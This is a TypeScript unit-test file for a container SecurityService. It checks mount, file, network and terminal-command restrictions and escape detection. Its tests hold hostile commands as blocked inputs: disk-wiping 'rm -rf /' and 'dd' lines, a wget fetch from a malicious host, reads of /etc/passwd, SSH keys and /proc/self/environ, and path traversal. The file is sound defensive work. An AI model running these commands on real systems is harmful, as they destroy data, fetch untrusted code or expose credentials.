import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SecurityService, createDefaultSecurityConfig, SecurityViolationType } from '../security';
import type { UserPermissions } from '@/types/domain';

describe('SecurityService', () => {
  let securityService: SecurityService;
  let mockLogger: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockLogger = vi.fn();
    const config = createDefaultSecurityConfig();
    securityService = new SecurityService(config, mockLogger);
  });

  describe('generateSecurityProfile', () => {
    it('should generate a security profile with proper restrictions', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main', 'develop'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);

      expect(profile.userId).toBe(1);
      expect(profile.permissions).toEqual(permissions);
      expect(profile.networkRestrictions.enableInternet).toBe(false);
      expect(profile.fileSystemRestrictions.allowedPaths).toContain('/home/coder/workspace');
      expect(profile.terminalRestrictions.enabled).toBe(true);
    });

    it('should disable terminal when permissions deny it', () => {
      const permissions: UserPermissions = {
        canCreateBranches: false,
        branchLimit: 0,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: false,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);

      expect(profile.terminalRestrictions.enabled).toBe(false);
      expect(profile.terminalRestrictions.allowedCommands).toEqual([]);
    });
  });

  describe('generateDockerSecurityOptions', () => {
    it('should generate secure Docker options', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const options = securityService.generateDockerSecurityOptions(profile);

      expect(options.securityOpt).toContain('no-new-privileges:true');
      expect(options.capDrop).toContain('ALL');
      expect(options.readOnlyRootfs).toBe(true);
      expect(options.tmpfs).toHaveProperty('/tmp');
    });
  });

  describe('validateMountConfig', () => {
    it('should allow valid mount paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const mounts = [
        {
          source: '/srv/worktrees/user1/repo1/branch1',
          target: '/home/coder/workspace',
          type: 'bind',
          readOnly: false,
        },
      ];

      const validatedMounts = securityService.validateMountConfig(mounts, profile);

      expect(validatedMounts).toHaveLength(1);
      expect(validatedMounts[0]?.target).toBe('/home/coder/workspace');
    });

    it('should block unauthorized mount paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const mounts = [
        {
          source: '/etc/passwd',
          target: '/etc/passwd',
          type: 'bind',
          readOnly: false,
        },
      ];

      const validatedMounts = securityService.validateMountConfig(mounts, profile);

      expect(validatedMounts).toHaveLength(0);
      expect(mockLogger).toHaveBeenCalledWith(
        'warn',
        expect.stringContaining('Security violation detected'),
        expect.objectContaining({
          type: SecurityViolationType.UNAUTHORIZED_FILE_ACCESS,
        })
      );
    });

    it('should enforce read-only for system paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const mounts = [
        {
          source: '/usr/bin',
          target: '/usr/bin',
          type: 'bind',
          readOnly: false,
        },
      ];

      // Modify profile to allow this path for testing
      profile.fileSystemRestrictions.allowedPaths.push('/usr/bin');

      const validatedMounts = securityService.validateMountConfig(mounts, profile);

      expect(validatedMounts).toHaveLength(1);
      expect(validatedMounts[0]?.readOnly).toBe(true);
    });
  });

  describe('validateTerminalCommand', () => {
    it('should allow safe commands', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateTerminalCommand('ls -la', profile, 'session1');

      expect(result.allowed).toBe(true);
    });

    it('should block dangerous commands', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateTerminalCommand('rm -rf /', profile, 'session1');

      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/blocked by security policy|Command contains dangerous patterns/);
    });

    it('should deny terminal access when disabled', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: false,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateTerminalCommand('ls', profile, 'session1');

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Terminal access disabled');
    });

    it('should enforce whitelist when configured', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      profile.terminalRestrictions.allowedCommands = ['git', 'npm'];

      const gitResult = securityService.validateTerminalCommand('git status', profile, 'session1');
      expect(gitResult.allowed).toBe(true);

      const lsResult = securityService.validateTerminalCommand('ls -la', profile, 'session1');
      expect(lsResult.allowed).toBe(false);
      expect(lsResult.reason).toContain('not in allowed list');
    });
  });

  describe('monitorResourceUsage', () => {
    it('should detect memory limit violations', async () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      profile.resourceLimits.memory = '1g'; // 1GB limit

      const stats = {
        cpu: 50,
        memory: 2 * 1024 * 1024 * 1024, // 2GB usage
      };

      const result = await securityService.monitorResourceUsage('container1', profile, stats);

      expect(result.withinLimits).toBe(false);
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0]).toContain('Memory usage');
    });

    it('should detect CPU limit violations', async () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      profile.resourceLimits.cpu = '0.5'; // 50% CPU limit

      const stats = {
        cpu: 80, // 80% CPU usage
        memory: 1024 * 1024 * 1024, // 1GB
      };

      const result = await securityService.monitorResourceUsage('container1', profile, stats);

      expect(result.withinLimits).toBe(false);
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0]).toContain('CPU usage');
    });

    it('should pass when within limits', async () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);

      const stats = {
        cpu: 30, // 30% CPU usage
        memory: 1024 * 1024 * 1024, // 1GB
      };

      const result = await securityService.monitorResourceUsage('container1', profile, stats);

      expect(result.withinLimits).toBe(true);
      expect(result.violations).toHaveLength(0);
    });
  });

  describe('getSecurityMetrics', () => {
    it('should return empty metrics initially', () => {
      const metrics = securityService.getSecurityMetrics();

      expect(metrics.totalViolations).toBe(0);
      expect(metrics.blockedActions).toBe(0);
      expect(metrics.activeThreats).toBe(0);
    });

    it('should track violations correctly', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: false,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      
      // Generate some violations
      securityService.validateTerminalCommand('ls', profile, 'session1');
      securityService.validateTerminalCommand('pwd', profile, 'session2');

      const metrics = securityService.getSecurityMetrics();

      expect(metrics.totalViolations).toBe(2);
      expect(metrics.blockedActions).toBe(2);
      expect(metrics.violationsByType[SecurityViolationType.TERMINAL_ACCESS_DENIED]).toBe(2);
    });
  });

  describe('validateFileAccess', () => {
    it('should allow access to permitted paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateFileAccess(
        '/home/coder/workspace/test.js',
        'read',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(true);
    });

    it('should block access to unauthorized paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateFileAccess(
        '/etc/passwd',
        'read',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('outside allowed directories');
    });

    it('should block write access to read-only paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      // Add /usr to allowed paths for testing
      profile.fileSystemRestrictions.allowedPaths.push('/usr');
      
      const result = securityService.validateFileAccess(
        '/usr/bin/test',
        'write',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('read-only path');
    });

    it('should block access to sensitive files', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      // Add /home to allowed paths for testing
      profile.fileSystemRestrictions.allowedPaths.push('/home');
      
      const result = securityService.validateFileAccess(
        '/home/user/.ssh/id_rsa',
        'read',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('sensitive file types');
    });
  });

  describe('validateNetworkAccess', () => {
    it('should block external network access when disabled', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateNetworkAccess(
        'google.com',
        80,
        'tcp',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('External network access is disabled');
    });

    it('should allow localhost connections', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateNetworkAccess(
        '127.0.0.1',
        8080,
        'tcp',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(true);
    });

    it('should block access to blocked ports', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateNetworkAccess(
        '127.0.0.1',
        22, // SSH port, typically blocked
        'tcp',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('port 22 is blocked');
    });
  });

  describe('detectEscapeAttempt', () => {
    it('should detect container escape attempts', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const isEscape = securityService.detectEscapeAttempt(
        'accessing /proc/self/root/etc/passwd',
        { suspicious: true },
        profile,
        'session1'
      );

      expect(isEscape).toBe(true);
      expect(mockLogger).toHaveBeenCalledWith(
        'error',
        expect.stringContaining('CRITICAL: Container escape attempt detected'),
        expect.any(Object)
      );
    });

    it('should not flag normal activities as escape attempts', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const isEscape = securityService.detectEscapeAttempt(
        'normal file access',
        {},
        profile,
        'session1'
      );

      expect(isEscape).toBe(false);
    });
  });

  describe('enhanced terminal command validation', () => {
    it('should block dangerous patterns', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      
      const dangerousCommands = [
        'rm -rf /',
        'dd if=/dev/zero of=/dev/sda',
        'mount /dev/sda1 /mnt',
        'docker run --privileged',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'eval("dangerous code")',
        '$(rm -rf /)',
        'cat /etc/passwd',
        'ssh user@host',
        'wget http://malicious.com/script.sh -o /tmp/script.sh',
      ];

      dangerousCommands.forEach(command => {
        const result = securityService.validateTerminalCommand(command, profile, 'session1');
        expect(result.allowed).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });

    it('should detect path traversal attempts', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateTerminalCommand(
        'cat ../../etc/passwd',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/Path traversal attempts|Command contains dangerous patterns/);
    });

    it('should block access to restricted system paths', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: true,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      const result = securityService.validateTerminalCommand(
        'ls /proc/self/environ',
        profile,
        'session1'
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/restricted system paths|Command contains dangerous patterns/);
    });
  });

  describe('clearOldViolations', () => {
    it('should clear violations older than specified days', () => {
      const permissions: UserPermissions = {
        canCreateBranches: true,
        branchLimit: 5,
        allowedBaseBranches: ['main'],
        allowTerminalAccess: false,
      };

      const profile = securityService.generateSecurityProfile(1, permissions, 1);
      
      // Generate a violation
      securityService.validateTerminalCommand('ls', profile, 'session1');

      let metrics = securityService.getSecurityMetrics();
      expect(metrics.totalViolations).toBe(1);

      // Clear violations older than 0 days (should clear all violations from today and before)
      const clearedCount = securityService.clearOldViolations(0);

      expect(clearedCount).toBeGreaterThanOrEqual(0); // May be 0 or 1 depending on timing

      metrics = securityService.getSecurityMetrics();
      expect(metrics.totalViolations).toBeLessThanOrEqual(1); // Should be 0 or 1
    });
  });
});